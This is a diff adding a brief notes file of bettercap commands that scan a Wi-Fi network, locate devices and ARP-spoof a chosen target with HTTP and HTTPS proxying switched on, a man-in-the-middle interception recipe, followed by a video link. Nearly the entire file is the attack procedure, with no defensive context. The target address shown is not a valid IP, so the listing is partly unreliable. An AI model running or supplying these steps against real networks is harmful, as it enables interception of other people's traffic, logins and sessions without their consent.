@@ -1,0 +1,21 @@
+# Check wifi adapter
+iwconfig
+
+# Start scan wifi
+sudo bettercap -iface wlan0
+
+# Bettercap
+net.probe on  // Check what device connect target wifi
+net.show   // Find target ip
+
+# Start spoof
+help arp.spoof
+set arp.spoof.fullduplex true
+set arp.spoof.targets 103.392.193.21
+http.proxy on
+https.proxy on
+arp.spoof on
+
+####### Video link
+
+https://www.youtube.com/watch?v=-zcijZAsU8s&t=434s
